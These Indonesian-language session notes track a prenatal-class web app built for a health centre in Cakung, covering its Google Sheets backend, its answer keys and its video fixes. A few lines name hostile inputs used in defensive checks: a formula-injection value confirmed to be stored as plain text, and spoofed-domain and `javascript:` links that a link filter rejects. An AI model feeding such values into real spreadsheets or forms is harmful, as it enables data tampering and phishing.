# Catatan Sesi — KIARA

Rekaman keadaan proyek untuk dilanjutkan di sesi berikutnya.
Terakhir diperbarui: **5 Agustus 2026**, commit `9635e73`.

---

## 1. Identitas proyek

| | |
|---|---|
| Nama | KIARA — Kelas Ibu Hamil Digital |
| Klien | Puskesmas Kecamatan Cakung |
| Alur inti | Pasien scan QR di ruang tunggu → isi NIK → aplikasi kenali riwayat → tentukan sesi ke berapa → pre-test → materi → post-test → simpan ke Google Sheet |
| Folder | `dashboard/kiara-puskes-cakung/` |
| Repo | https://github.com/iamsleepyhead00/kiara-puskes-cakung (publik) |
| Spreadsheet | "Rekap Hasil Kiara 2026", tab `KIARA` |
| Endpoint | lihat `SHEETS_ENDPOINT` di `config.js` |
| Server preview | `python -m http.server 8000` di folder proyek |

**Dokumen acuan alur:** `konsep KIARA.docx` (2 Agu 2026). Menggantikan
`FORMAT KIARA.docx` (31 Jul) — yang lama jangan dipakai lagi. Dokumen sumber
pernah diedit klien saat sedang dianalisis, jadi bisa berubah lagi.

**Sumber konten:** folder `DATA BASE VIDEO-20260805T145907Z-1-001` di Downloads
(5 Agu 2026) — 6 video + 9 berkas soal, prefiks `K.1`–`K.4` = kunjungan 1–4.
Ini menggantikan bank soal Buku Pegangan Fasilitator dan paket video TTD/MMS.

---

## 2. Status sekarang

**Yang sudah jalan dan terverifikasi:**

- GitHub Pages aktif, seluruh perubahan sampai 9 Agustus sudah tayang.
  Commit terakhir: `6a70f07`
- Backend Apps Script **ter-deploy pada `versi: 12` dan sinkron dengan repo**,
  terverifikasi live 9 Agustus lewat `?action=ping`
- **Seluruh 10 opsi tempat periksa diuji satu per satu ke endpoint hidup dan
  semuanya diterima**, termasuk "Klinik/Praktik Bidan". `Klinik` dan
  `Praktik Bidan` yang terpisah kini ditolak — itu memang benar, karena kalau
  ada HP yang masih memegang `config.js` lama, penyimpanannya gagal
  terang-terangan alih-alih menyelipkan nilai tak dikenal ke sheet bidan
- Simpan dan lookup dari origin `github.io` terbukti jalan — CORS beres
  (`Access-Control-Allow-Origin: *` di dua hop), baris mendarat di sheet
- Waktu terukur 9 Agu pada `versi: 10`: simpan rata-rata **2.516 ms**
  (rentang 1.819–5.060), lookup sekitar **2.400 ms**. Sekitar 1,5 detik dari
  itu biaya tetap Apps Script — lookup yang cuma satu pembacaan pun 1,7 detik.
  Outlier 5 detik muncul saat skrip baru dibangunkan (cold start)
- Pra-ambil riwayat membuat 1,7 detik lookup itu tidak dirasakan ibu: berjalan
  di belakang layar sejak NIK dilengkapi
- Validasi terbukti: `kkm=0` tetap menghasilkan `BELUM` bukan `LULUS`;
  `=CONCATENATE(E2:E50)` tersimpan sebagai teks bukan formula; kelurahan di luar
  daftar ditolak; "Luar wilayah Cakung" diterima
- **Skor 15 soal terverifikasi pada `versi: 10`** — seluruh 16 kemungkinan
  (0, 7, 13, 20, 27, 33, 40, 47, 53, 60, 67, 73, 80, 87, 93, 100) diterima,
  dan garis LULUS jatuh tepat di 12/15. Ditolak: 101, −5, 80.5, `abc`
- **Skor kosong ditolak** sejak `versi: 10` (`"Post-Test tidak terkirim"`).
  Sebelumnya kosong ditulis 0 diam-diam — bug di aplikasi bisa menghasilkan
  baris bernilai 0 yang tampak sah. Skor 0 yang sungguhan tetap diterima
- **Duplikat tidak bisa masuk** — 5 submit bersamaan untuk kunjungan yang sama
  menghasilkan tepat 1 baris, 4 sisanya `DUPLIKAT`. `LockService` bekerja.
  Post-test yang diulang memperbarui baris, bukan menambah
- **Kunci jawaban resmi** dari paket 9 Agustus — bukan lagi turunan
- Semua 9 topik aktif punya videonya. Tidak ada pasien yang diuji tanpa materi
- `OFFLINE_MODE: false` — aplikasi tersambung ke sheet sungguhan
- Favicon ikon ibu hamil (Material Symbols Rounded) di tab browser

**Berubah 5 Agustus:** puskesmas mengirim folder `DATA BASE VIDEO` — 6 video
(186 MB) + 9 berkas soal, diberi prefiks K.1–K.4 untuk kunjungan 1–4. Ini
mengganti seluruh sumber konten sebelumnya. Blocker video praktis selesai:
1.122 MB → 186 MB, berkas terbesar 68 MB (di bawah batas 100 MB GitHub).

**Berubah 9 Agustus:** paket kunci jawaban resmi datang, topik Anemia masuk
kunjungan 3 (jadi 15 soal), dan 3 video baru ditambahkan. Note grup WhatsApp
dipasang di layar hasil. Backend naik `versi: 9` → 10 → 11 → **12, dan versi 12
sudah di-deploy serta diuji**. Ikon splash diperbesar, opsi tempat periksa
ditambah, nomor WhatsApp laporan diganti, dan pesan galat video diperjelas.

**Sisa blocker sebelum dipakai pasien nyata:**

1. **Endpoint Apps Script masih terbuka** dan URL-nya ada di repo publik —
   lihat bagian 8
2. **Tautan grup WhatsApp publik** — admin grup harus menyalakan "Setujui
   anggota baru" dulu, lihat bagian 8
3. **`hapusUji()` belum dijalankan** — baris uji masih ada di sheet bidan

Kunci jawaban sudah resmi, materi lengkap, dan backend sinkron — tiga hal itu
bukan penghalang lagi. Yang tersisa semuanya tindakan di akun Google/WhatsApp
user, bukan pekerjaan kode.

---

## 3. Keputusan yang sudah dipatok klien

Jangan diubah tanpa instruksi baru.

| Hal | Keputusan |
|---|---|
| Panjang program | **10 pertemuan** (`TOTAL_SESI`). LULUS baru terbit setelah kunjungan ke-10 |
| Sesi yang bisa dijalankan | **1–4** (`SESI_TERSEDIA`) = kunjungan K.1–K.4. Sesi 5–10 terdaftar tapi materi & soalnya kosong → layar "belum tersedia" |
| Dropdown koreksi sesi | ikut `SESI_TERSEDIA` (1–4), bukan `TOTAL_SESI` |
| Sumber konten | `drive-download-20260809T015409Z-1-001` (9 Agu), **kunci jawaban resmi** ditandai huruf tebal. Menggantikan paket 5 Agu |
| Topik per kunjungan | 2 topik, **kecuali kunjungan 3 yang punya 3** (Perawatan, Mitos, Anemia) |
| Soal per kunjungan | tiap topik 5 soal → **10, 10, 15, 10**. Digabung jadi satu pre-test dan satu post-test |
| KKM | **80 = 80% benar**. Kunjungan 1/2/4: 8 dari 10. Kunjungan 3: **12 dari 15** |
| Validasi skor backend | **bilangan bulat 0–100**, bukan lagi "kelipatan 10" — 15 soal menghasilkan 7, 13, 27, dst |
| Video anemia | dari **EduCatin**, bukan puskesmas. Mereka mengirim soalnya tanpa video |
| Materi PDF | **tidak dipakai** (slide + komik). Definisi disimpan di `materiDitahan`, file PDF sudah dihapus dari disk — bisa dibuat ulang dari zip di Downloads |
| Sertifikat kelulusan | **DI-HOLD**. Jangan dibangun. Layar S13 dan `ENABLE_SERTIFIKAT` sudah dicabut |
| Struktur sheet | **13 kolom datar**, ditetapkan puskesmas. Jangan diubah |
| Tombol kirim WA | **tidak muncul** kalau belum capai KKM. Sekarang hanya ada di S8 dan S10 |
| Tombol "Materi Berikutnya" | **disembunyikan**, bukan diredam, sampai materi tuntas |
| Dropdown | placeholder wajib jadi nilai awal, tapi **tidak boleh muncul sebagai baris** di daftar (pakai atribut `hidden`) |
| Nomor WA tujuan | `085889945829` (bukan yang lama `085945371933`) |
| Kelurahan | 8 kelurahan Cakung + **"Luar wilayah Cakung"** (6 Agu). Ibu luar wilayah boleh ikut |
| Pemulihan sesi | progres disimpan di HP, **berlaku sehari**, ditawarkan bukan otomatis, dihapus setelah tuntas |
| Keamanan endpoint | risiko diterima selama masa uji, repo tetap publik |

---

## 4. Yang dikerjakan di sesi ini

### Ronde 3 — 9 Agustus (paling baru)

Empat commit, urut: `fb1b72c` → `653372d` → `b6f5a5e` → `daa7ecd`.

**Note grup WhatsApp — `fb1b72c`.** Permintaan klien: *"Paling terakhir sebelum
submit ada pilihan. Jika ada pertanyaan dari semua materi di atas, silahkan
gabung ke grup kelas ibu hamil online."* Dibuat sebagai note, bukan tombol
utama.

Dipasang di layar hasil **S8** (lulus KKM) dan **S12** (belum KKM), tepat
sebelum tombol aksi. TIDAK dipasang di tengah alur: membuka WhatsApp
memindahkan ibu keluar dari browser, dan di Android bermemori kecil halaman di
latar bisa dimatikan sistem. Kalau itu terjadi sebelum penyimpanan selesai,
hasil ibu hilang. Di S8 posisinya tetap "sebelum submit" dalam arti sebelum
tombol Kirim Hasil ke WhatsApp. S12 ikut dipasangi karena ibu yang belum
mencapai KKM justru paling butuh tempat bertanya.

Dikendalikan `CFG.WA_GRUP_LINK`. Kosong = note hilang, tanpa menyentuh HTML.
Tautan dibersihkan dari parameter pelacak (`?s=sh&p=a&ilr=0` dibuang).

`isiNoteGrup()` menyaring tautan dengan regex ketat
`^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$`. Yang ditolak: `http` biasa,
domain menyamar seperti `chat.whatsapp.com.evil.com`, skema `javascript:`, dan
`wa.me` (chat pribadi, bukan grup). Alasannya yang mengklik adalah ibu hamil
yang percaya tautan itu dari puskesmas.

Tidak ada kolom baru di sheet — bergabung grup tidak direkam.

`style.css` ditambah `a.tlink{text-decoration:none}`. Kelas `.tlink`
sebelumnya hanya dipakai di `<span>`; pada `<a>` garis bawah bawaan browser
ikut menutupi ikon, padahal desainnya sengaja hanya menggarisbawahi teks.

**Ikon splash diperbesar — `653372d`.** 42px → 62px. Ikon terlihat jauh lebih
kecil dari angka px-nya karena Material Symbols menyisakan ruang kosong di
dalam viewBox: figur ibu hamil hanya mengisi ±sepertiga lebar dan 83% tinggi
kotak 960×960. Pada 42px yang benar-benar terlihat cuma ±35px tinggi dan ±14px
lebar, jadi terkesan mungil di dalam kotak `.sp-logo` yang 92px. Kotak dan
animasi halo tidak diubah. Ikon header (`.ah-i svg`, 17px) juga tidak diubah
karena aturan itu dipakai bersama seluruh ikon Lucide di semua header.

**Tiga permintaan klien — `b6f5a5e`.**

1. Opsi tempat periksa ditambah "Klinik" dan "Praktik Bidan"
2. Nomor WhatsApp laporan diganti jadi `6285945371933`
3. Laporan "video 1000 HPK tidak bisa"

Nomor WhatsApp riwayatnya bolak-balik, dicatat di `config.js` supaya tidak
diubah balik keliru:

| Sumber | Nomor |
|---|---|
| FORMAT KIARA.docx (31 Juli) | `085945371933` |
| konsep KIARA.docx (2 Agu) | `6285889945829` |
| instruksi klien (9 Agu) | `6285945371933` ← dipakai sekarang |

Nomor 9 Agustus itu sama dengan yang di FORMAT KIARA, hanya ditulis dengan
awalan 62. Jadi klien kembali ke nomor semula.

**Video 1000 HPK — berkasnya TERBUKTI SEHAT.** Ditelusuri dengan membongkar
struktur MP4 dan membandingkannya dengan tiga video yang normal:

| Pemeriksaan | Hasil |
|---|---|
| Ukuran disk vs server | 53.329.939 byte, **sama persis** |
| Codec | H.264 (`avc1`) + AAC (`mp4a`), brand `mp42` |
| Faststart | `moov` di depan `mdat` — bisa diputar sambil mengunduh |
| Durasi / bitrate | 4m59s, 1,43 Mbps |
| Unduh penuh dari Pages | berhasil, 8,5 MB/s |

Satu-satunya beda dari video lain: urutan track (audio dulu, video kedua). Itu
tidak menghalangi browser. Jadi kegagalannya di perangkat, bukan di berkas.

Masalahnya pesan galat lama hanya menulis "Video tidak bisa dimuat" tanpa
alasan — jaringan putus, berkas hilang, dan codec tidak didukung semuanya
terlihat sama dan tidak bisa dilacak. Sekarang `MediaError` dibaca dan
dibedakan:

| Kode | Arti | Yang ditampilkan |
|---|---|---|
| 1 | ABORTED | pemuatan dibatalkan |
| 2 | NETWORK | jaringan terputus, saran coba lagi saat sinyal stabil |
| 3 | DECODE | berkas rusak / tidak terbaca perangkat |
| 4 | SRC_NOT_SUPPORTED | format tidak didukung atau berkas tidak ditemukan |

Kode, pesan, `networkState`, dan `readyState` ikut ke console.

**Belum ada jawaban kodenya berapa dari klien.** Langkah lanjut tergantung itu:
kode 2 berarti murni jaringan (51 MB berat untuk kuota HP, solusinya kompres),
kode 4 aneh karena URL-nya jelas 200 (kemungkinan cache lama), kode 3 berarti
perangkatnya tidak sanggup decode (perlu re-encode profil lebih rendah).
Kemungkinan lain: videonya jalan tapi tombol "Materi Berikutnya" tidak muncul,
karena `ANTI_SKIP` menahannya sampai 90% ditonton — dan 90% dari 4m59s itu
**269 detik**.

**Penyederhanaan opsi + label — `daa7ecd`.** Setelah melihat dropdown-nya,
klien minta "Klinik" dan "Praktik Bidan" digabung jadi satu
"Klinik/Praktik Bidan" (11 opsi → 10), dan label "Puskesmas Tempat Periksa"
diganti jadi **"Tempat Periksa"**.

Label diganti di semua tempat yang dilihat ibu, bukan cuma label form: label
field S2, baris hasil S8, placeholder dropdown (dulu menyebut puskesmas /
pustu), pesan galat validasi, dan dua template pesan WhatsApp.

Yang **sengaja tidak diubah**: kolom sheet tetap bernama `Puskesmas`
(`HEADER_HARAPAN`, aturan 13 kolom) dan nama field payload tetap `puskesmas`.
Mengubahnya memutus jalur simpan dan memaksa bidan mengganti judul kolom di
spreadsheet yang sudah berjalan.

Efek samping yang harus diurus: "Tempat Periksa" panjangnya 14 karakter,
sementara kolom label di `waTemplateHasil` hanya 12. Seluruh 11 baris di blok
itu dilebarkan jadi 14 supaya titik dua-nya tetap lurus di WhatsApp.
`waTemplateRekap` sudah 16 karakter, cukup ditambah 2 spasi. Uji sekarang
memeriksa perataan ini otomatis.

**Perubahan berkas ronde 3:**

| Berkas | Perubahan |
|---|---|
| `config.js` | `WA_GRUP_LINK`, `TARGET_PHONE` baru, opsi Klinik/Praktik Bidan, peringatan duplikasi daftar |
| `gas/Code.gs` | `PUSKESMAS_SAH` + Klinik/Praktik Bidan, `versi: 10` → 12 |
| `app.js` | `isiNoteGrup()`, `MediaError` dibedakan, placeholder & pesan galat diganti |
| `content.js` | dua template WhatsApp: label + perataan |
| `index.html` | note grup di S8 & S12, label Tempat Periksa, versi asset |
| `style.css` | ikon splash 62px, `a.tlink` |

Versi asset akhir: `style.css?v=13`, `config.js?v=15`, `content.js?v=10`,
`app.js?v=23`, `visit-tracker.js?v=5`.

**Keputusan klien di ronde ini:**

- Item `perluKonfirmasi` (K.3 Mitos no. 1 dan dua di `setSoalDitahan`)
  **diabaikan** — kunci resmi puskesmas dipakai apa adanya. Penanda itu hanya
  muncul di `console.warn`, tidak terlihat ibu, jadi tidak ada dampak ke alur
- Revisi "puskesmas tempat periksa" diselesaikan klien sendiri: labelnya
  sempat diubah jadi "Puskesmas Tempat Periksa" tanpa field baru, jadi
  struktur 13 kolom tidak terganggu

---

### Paket konten 9 Agustus — kunci jawaban resmi akhirnya datang

Puskesmas mengirim `drive-download-20260809T015409Z-1-001.zip` (220 MB). Isinya
7 video + 9 berkas soal, dan yang menentukan: **kunci jawaban ditandai huruf
tebal** di berkas .docx. Dibaca lewat `python-docx` dengan memeriksa
`run.bold`, bukan sekadar teksnya.

**Blocker utama proyek ini selesai.** Kunci sudah resmi, bukan turunan.

**Verifikasi terbukti perlu — dua kunci turunan ternyata keliru:**

| Soal | Kunci turunan | Kunci resmi |
|---|---|---|
| K.1 Tanda Kehamilan no. 4 — *"trimester kedua 1 kali"* | Benar | **Salah** |
| K.2 KEK no. 5 — *"mual dan tidak nafsu makan menyebabkan KEK"* | Benar | **Salah** |

38 dari 40 cocok. Yang pertama memang sudah ditandai perlu konfirmasi karena
bergantung pedoman — dinalar dari standar ANC 6× (TM1 2×, TM2 1×, TM3 3×);
puskesmas memakai pembagian berbeda. Yang kedua sebelumnya dinilai "tidak
ambigu", dan **penilaian itu yang salah**: KEK adalah kekurangan energi
*kronis*, sementara mual hamil bersifat akut.

Kalau tidak diverifikasi, ibu yang menjawab benar akan dinyatakan salah pada
dua soal itu — cukup untuk menggeser status LULUS.

**Perubahan konten:**

| Hal | Detail |
|---|---|
| K.1 no. 2 diganti | *"terbagi menjadi 3 trimester"* → *"idealnya sebanyak 6 kali selama kehamilan"* (Benar) |
| K.3 Mitos dan Fakta | **diganti seluruhnya.** Isi lamanya soal anemia dan mitos TTD — pindah dan diperluas ke topik Anemia. Sekarang berisi mitos kehamilan: makan 2 porsi, olahraga, makan ikan |
| K.3 Anemia | **topik baru**, 5 soal |
| Imunisasi | tidak ada di paket ini. Tetap ditahan, kuncinya masih turunan |

**Dua lubang materi tertutup.** Topik yang sebelumnya diuji tanpa video kini
punya videonya: `K3-Mitos-dan-Fakta.mp4` (20 MB) dan `K4-Tanda-Bahaya.mp4`
(14 MB). Video anemia diambil dari **EduCatin**
(`dashboard/questionnaire/video-anemia.mp4`, 12,5 MB) atas instruksi klien —
puskesmas mengirim soalnya tanpa video.

Media aktif jadi **9 berkas, 233 MB** (dari 6 berkas, 186 MB).

**Jumlah soal per kunjungan jadi tidak seragam.** Ini konsekuensi yang perlu
diingat:

| Kunjungan | Topik | Soal | KKM 80 berarti |
|---|---|---|---|
| 1 | Tanda Kehamilan, 1000 HPK | 10 | 8 dari 10 |
| 2 | Gizi, KEK | 10 | 8 dari 10 |
| **3** | Perawatan, Mitos, **Anemia** | **15** | **12 dari 15** |
| 4 | Dihindari, Tanda Bahaya | 10 | 8 dari 10 |

Klien memilih mempertahankan semua soal (opsi A dari tiga pilihan) daripada
membuangnya atau memindahkan Anemia ke kunjungan lain — puskesmas sendiri yang
menulis prefiks `K.3`.

Konsekuensinya **validasi "skor harus kelipatan 10" di backend harus dicabut**.
Dengan 15 soal, skornya 0, 7, 13, 20, 27, 33 dan seterusnya — bukan kelipatan
angka tertentu. Diganti batas bilangan bulat 0–100.

Ini memang lebih longgar. Peredam lain tetap jalan: clamp KKM (`kkm=0` tidak
bisa membuat semua LULUS), throttle 40 simpan/10 menit, anti-injeksi formula,
dan validasi kelurahan/puskesmas/nama/NIK.

`SOAL_PER_SESI` diganti `SOAL_PER_TOPIK: 5` — jumlah soal per sesi sekarang
dihitung dari `setSoal`, bukan dipatok. Diagnostik di console ikut berubah:
memeriksa jumlah soal = jumlah topik × 5, jadi topik yang berkasnya terpotong
tetap ketahuan.

**Satu kunci resmi terlihat keliru dan TIDAK dikoreksi sendiri.**

K.3 Mitos dan Fakta no. 1 — *"Apakah selama kehamilan wajib melakukan periksa
hamil rutin?"* → kunci resmi **Salah**. Itu bertentangan dengan no. 5 di set
yang sama — *"Tidak perlu periksa hamil jika tidak ada keluhan"* → juga
**Salah**. Dua-duanya tidak bisa benar sekaligus.

Dugaan: seluruh set berisi mitos yang dijawab Salah, dan no. 1 terbawa padahal
kalimatnya bukan mitos. Ditulis apa adanya dan ditandai `perluKonfirmasi`.

**Catatan teknis: tiga berkas berekstensi `.docx` ternyata mp4.**
`K.1 TANDA KEHAMILAN.docx`, `K.3 VIDEO PERAWATAN....docx`,
`K.4 VIDEO HAL-HAL....docx` — diperiksa dari magic bytes, semuanya `ftyp`.
Kebetulan ketiganya duplikat byte-per-byte dari yang sudah ada di `media/`
(diverifikasi MD5), jadi tidak berdampak. Tapi kalau puskesmas mengirim lagi
dengan pola sama, isinya bisa video baru yang terlewat — **periksa jenis berkas
dari magic bytes, jangan percaya ekstensinya.**

Yang berubah:

| File | Perubahan |
|---|---|
| `content.js` | seluruh kunci diganti versi resmi, `kunciTurunan` dicabut dari set aktif |
| `content.js` | `K3_MITOS_FAKTA` diganti total, `K3_ANEMIA` baru, materi `K3_MITOS_FAKTA`/`K3_ANEMIA`/`K4_TANDA_BAHAYA` baru |
| `content.js` | sesi 3 jadi tiga topik, sesi 4 dapat video keduanya |
| `config.js` | `SOAL_PER_SESI: 10` → `SOAL_PER_TOPIK: 5` |
| `gas/Code.gs` | `POIN_PER_SOAL` dicabut, validasi skor jadi bilangan bulat 0–100, `versi: 9` |
| `app.js` | diagnostik jumlah soal ikut jumlah topik, peringatan `tanpaVideo` dicabut |
| `.gitignore` | tiga video baru diizinkan |
| `KUNCI-JAWABAN.md` | menggantikan `KUNCI-JAWABAN-PERLU-VERIFIKASI.md` yang dihapus |
| `index.html` | `config.js?v=12`, `content.js?v=9`, `app.js?v=20` |

Verifikasi: **83 uji lolos** — jumlah soal 10/10/15/10, dua koreksi kunci,
set Anemia, Mitos diganti, semua topik punya video, 9 berkas ada di disk,
ambang lulus tetap 80% di semua sesi, dan anti-skip/layar penuh/pra-ambil/
pemulihan progres tidak tersentuh.

Satu bug yang gw bikin dan ketangkap uji: komentar di `content.js` memuat
teks `**Benar**/Salah`, dan rangkaian `*/` di situ **menutup komentar blok
lebih awal** sehingga sisanya jadi kode. Kalimatnya diubah.

### Revisi ronde 2 — 7 Agustus

Semuanya temuan klien saat mencoba aplikasi di HP lewat GitHub Pages.

**Video tidak bisa layar penuh.** Penyebabnya anti-skip: `v.controls = !CFG.ANTI_SKIP`
mematikan kontrol bawaan, dan tombol layar penuh itu bagian dari kontrol bawaan.

Solusinya bukan menghidupkan kontrol bawaan — itu mengembalikan progress bar
dan anti-skip jadi sia-sia. Ditambah tombol sendiri (`#mt-fs`) yang
me-fullscreen **kotak pembungkus** `.vid`, bukan elemen `<video>`. Kalau
elemen videonya yang di-fullscreen, browser memunculkan pemutar bawaannya
lengkap dengan seek bar.

| Detail | Alasan |
|---|---|
| Bar progres tetap tampil di layar penuh | ibu masih perlu melihat berapa yang sudah ditonton |
| Coba `screen.orientation.lock('landscape')` | video 16:9 di HP tegak banyak kotak hitamnya. Banyak browser menolak; kegagalan diabaikan |
| Dengarkan `fullscreenchange` | ibu bisa keluar lewat tombol Back atau Esc — ikon harus ikut keadaan sebenarnya |
| Tombol disembunyikan kalau Fullscreen API tidak ada | **Safari iOS tidak mendukung fullscreen elemen sembarang**, hanya `<video>`. Lebih baik tidak ada tombol daripada tombol yang menghadirkan seek bar |

**Label "MATERI n" menutupi video.** `.vlab` dipasang `position:absolute` di
pojok kiri atas dan menempel permanen — di materi Gizi 1000 HPK dia menimpa
judul yang tertulis di dalam videonya. Sekarang memudar hilang begitu video
diputar (`.vid.playing .vlab`). Nomor materi tetap terlihat di `mt-count`
(kanan atas header) dan di daftar materi, jadi tidak ada informasi yang hilang.

**Sesi jadi 1–10.** Klien: programnya memang 10 pertemuan, jangan berpura-pura
4. Tapi materi dan soal baru ada untuk K.1–K.4.

Dipisah jadi dua angka, dan bedanya penting:

| Konfigurasi | Arti |
|---|---|
| `TOTAL_SESI: 10` | panjang program sebenarnya. Semua tampilan menyebut "dari 10", LULUS baru terbit setelah kunjungan ke-10 |
| `SESI_TERSEDIA: 4` | berapa sesi yang benar-benar bisa dijalankan aplikasi |

Sesi 5–10 terdaftar di `content.js` dengan judul dan pokok bahasan, tapi
`materi` dan `setSoal` kosong. Ibu yang sampai di sesi 5 melihat layar baru
**`s-belum`** ("Materi Belum Tersedia"), bukan pre-test nol soal — tanpa
penjagaan itu `soalSesi(5)` mengembalikan array kosong, skornya 0, dan
aplikasi terlihat rusak.

Dropdown koreksi sesi difilter `SESI_TERSEDIA`, bukan `TOTAL_SESI` — petugas
tidak boleh bisa memilih sesi yang soalnya kosong. Validasi di
`simpanKoreksi()` ikut, jadi tetap aman walau HTML-nya diotak-atik.

⚠️ **Judul sesi 5–10 perlu dikonfirmasi.** Diambil dari nama slide deck
`MATERI 1-10 KIARA.zip` kiriman puskesmas — sumbernya sah, tapi penomoran deck
itu belum tentu sejajar dengan penomoran K.1–K.4. K.1 berisi Tanda Kehamilan +
1000 HPK, sementara slide 1 berjudul "Kehamilan yang Sehat".

**Kecepatan — "mencari riwayat" dan "merekam hasil" terasa lama.**

Penyebab utamanya di backend. `handleSave` membaca seluruh sheet **empat kali**
untuk satu penyimpanan:

| Pemanggil | Yang dibaca |
|---|---|
| `bedaHeader(sh)` | baris header |
| `ambilData(sh)` | seluruh data |
| `nomorBerikut(sh)` | seluruh data **lagi** |
| `handleLookup()` di akhir | seluruh data **lagi** |

Setiap panggilan Sheets dari Apps Script itu perjalanan jaringan, bukan
operasi memori. Sekarang: header dan data dibaca sekali jadi satu
`getValues()`, nomor urut dari data yang sudah di memori, riwayat disusun dari
memori dan ditambal dengan nilai yang baru ditulis. Yang di-update juga
dibatch — `POST` dan `STATUS` bersebelahan jadi satu `setValues`. Throttle
pakai `getProperties()` sekali, bukan `getProperty()` dua kali.

**Hasilnya: 4 pembacaan + 3 tulisan → 1 pembacaan + 1 tulisan.**

Helper baru: `bedaHeaderDari(header)` dan `riwayatDari(data, nik)` menerima
data yang sudah dibaca. `nomorBerikut(sh)` diganti `nomorBerikutDari(data)`.

Di frontend, kemenangan terbesarnya **pra-ambil riwayat**. NIK itu kolom
pertama — begitu 16 digitnya lengkap, pencarian jalan di belakang layar
sementara ibu masih mengisi nama, HP, alamat, kelurahan, puskesmas. Itu
puluhan detik. Saat SUBMIT ditekan hasilnya biasanya sudah siap.

Yang dijaga: hasil hanya dipakai kalau NIK-nya masih sama (ibu bisa
mengoreksi), pra-ambil yang masih berjalan **ditunggu** bukan diulang, dan
kegagalannya ditelan — `jalankanLookup()` mencoba lagi normal dan pesan
errornya muncul di tempat yang benar.

Ditambah `VT.pemanasan()` — ping murah untuk membangunkan container Apps
Script yang kena cold start. Dipanggil dua kali: saat splash (untuk pencarian
riwayat) dan saat post-test mulai (untuk penyimpanan, yang terjadi ±1 menit
kemudian saat container bisa sudah dingin lagi). Tidak jalan saat
`OFFLINE_MODE`.

Yang berubah:

| File | Perubahan |
|---|---|
| `index.html` | tombol `#mt-fs`, layar `s-belum`, versi asset |
| `style.css` | `.vfs`, aturan `:fullscreen`, `.vid.playing .vlab` |
| `app.js` | `toggleFullscreen()`, `fullscreenDidukung()`, `sedangFullscreen()`, `segarkanIkonFullscreen()` |
| `app.js` | `praAmbil` + `mulaiPraAmbil()` + `ambilRiwayat()`, dipakai `jalankanLookup()` |
| `app.js` | `tampilBelumTersedia()`, dropdown koreksi difilter, diagnostik hanya memeriksa sesi tersedia |
| `config.js` | `TOTAL_SESI: 4 → 10`, `SESI_TERSEDIA: 4` baru |
| `content.js` | sesi 5–10 ditambahkan, `materi` dan `setSoal` kosong |
| `visit-tracker.js` | `pemanasan()` baru |
| `gas/Code.gs` | `handleSave` dirampingkan, `riwayatDari`/`bedaHeaderDari`/`nomorBerikutDari`, throttle, `SESI_DEFAULT: 10`, `versi: 8` |

Verifikasi: 71 uji lolos — termasuk sesi 5–10 memang nol soal, LULUS baru di
sesi 10, `handleSave` tinggal satu `getValues()`, dan anti-skip serta
pemulihan progres tidak tersentuh.

### Revisi ronde 1 — 6 Agustus

Klien minta 6 revisi. Tiga dikerjakan (yang tidak butuh info tambahan),
tiga ditunda karena menunggu jawaban — lihat bagian 6.

**Kelurahan "Luar wilayah Cakung".** Ibu dari luar wilayah tetap boleh ikut
kelas. Ditaruh paling bawah supaya kelurahan Cakung tetap terlihat lebih dulu.

> ⚠️ **CATATAN HISTORIS 6 AGUSTUS — SUDAH LUNAS.** Keadaan yang digambarkan di
> bawah ini berlaku saat itu, bukan sekarang. Deployment kini `versi: 12` dan
> sinkron dengan repo; lihat 5.3. Ditinggalkan di sini karena pola masalahnya
> terulang beberapa kali dan berguna sebagai contoh.
>
> Daftar kelurahan ada di dua tempat: `config.js` untuk dropdown, dan
> `KELURAHAN_SAH` di `gas/Code.gs` untuk validasi. Waktu itu dua-duanya sudah
> diubah di repo, tapi deployment masih pakai daftar lama, sehingga ibu yang
> memilih "Luar wilayah Cakung" **gagal simpan** — ditolak
> `"Kelurahan tidak dikenali"`.
>
> Aman untuk sekarang karena GitHub Pages belum nyala, jadi belum ada pasien
> yang bisa membuka aplikasinya. Tapi urutannya wajib: **deploy Code.gs dulu,
> baru nyalakan Pages.** `versi` sudah dinaikkan 6 → 7 supaya bisa dicek.

**Ikon ibu hamil.** Menggantikan ikon bayi di tiga tempat: splash (S1),
header (S2 dst), dan `icons/favicon.svg`.

Yang dipakai: **Google Material Symbols `pregnant_woman`, varian Rounded.**
Lisensi Apache 2.0 — bebas komersial, boleh dimodifikasi, atribusi tidak
diwajibkan. Sumber `github.com/google/material-design-icons`. Atribusinya tetap
dicatat di komentar `index.html` dan `icons/favicon.svg` sebagai praktik baik.

Jalan sampai ke situ tidak lurus, dan pelajarannya perlu dicatat:

1. **Percobaan pertama: menggambar sendiri.** Lucide tidak punya ikon ibu hamil
   (hanya `baby`, `person-standing`, `heart`), dan Flaticon/iStock menuntut
   atribusi yang tidak enak di repo publik. Jadi koordinat SVG-nya ditulis
   manual, gaya garis meniru Lucide.
2. **Ditolak klien.** Alasannya tepat dan bisa dilihat di gambar: kepala tidak
   menyambung ke badan sehingga tampak seperti balon di atas tongkat, dan
   keseluruhannya terbaca sebagai huruf **"b"** — bukan orang. Di 16px cuma
   jadi bercak. Bulatan bayi di perut terbaca sebagai lubang.
3. **Akar masalahnya:** menggambar ilustrasi lewat koordinat manual tanpa bisa
   melihat hasilnya. Untuk ikon, ambil yang sudah digambar desainer.
4. Klien sempat memilih varian buatan sendiri (rangka sama + hati di perut),
   lalu berganti ke Material Symbols Rounted setelah membandingkan tujuh
   varian berdampingan di halaman pratinjau.

Bentuknya **padat (fill)**, berbeda dari ikon Lucide lain di aplikasi yang
bergaris tipis. Itu disengaja: di favicon 16px garis tipis nyaris hilang,
bidang penuh tetap terbaca. Konsekuensinya ikon KIARA di header tampak lebih
berat dari ikon di sekitarnya — untuk ikon merek itu wajar.

Dipasang sebagai SVG inline, bukan `data-lucide`, jadi `lucide.createIcons()`
tidak menyentuhnya. Warnanya ikut `currentColor` sehingga CSS yang sudah ada
(`.sp-logo svg`, `.ah-i svg`) tetap berlaku tanpa perubahan. `viewBox`-nya
`0 -960 960 960` — itu sistem koordinat Material Symbols, bukan salah tulis.

**Animasi splash — halo berdenyut.** Dipilih klien dari empat varian
(bernapas, detak jantung, halo, mengapung).

Dua cincin menyebar keluar dari kotak logo; ikonnya sendiri diam. Cincin kedua
diberi jeda setengah siklus (1,65s) supaya alirannya terus-menerus, bukan dua
cincin muncul bersamaan. Hati kecil di bawah tulisan KIARA ikut berdenyut.

| Keputusan | Alasan |
|---|---|
| Mulai setelah 0,7 detik | animasi masuk `naik` juga memakai `transform` — kalau bersamaan, tabrakan |
